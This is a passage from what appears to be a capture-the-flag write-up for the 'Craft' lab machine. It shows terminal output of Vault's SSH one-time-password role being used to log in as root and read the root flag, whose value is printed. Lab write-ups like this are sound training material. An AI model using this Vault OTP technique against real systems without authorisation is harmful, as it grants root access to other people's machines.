+For now, Vault will attempt to guess based on the API response. This will be
+removed in the Vault 1.1.
+Vault SSH: Role: "root_otp"
+Vault could not locate "sshpass". The OTP code for the session is displayed
+below. Enter this code in the SSH password prompt. If you install sshpass,
+Vault can automatically perform this step for you.
+OTP for the session is: 2caf1268-6125-1aaa-fedf-9d8975daef68
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 2caf1268-6125-1aaa-fedf-9d8975daef68
+
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 27 04:53:14 2019
+root@craft:~# 
+
+root@craft:~# ls
+ls
+root.txt
+root@craft:~# cat root.txt
+cat root.txt
+831d64ef54d92c1af795daae28a11591
+root@craft:~# 
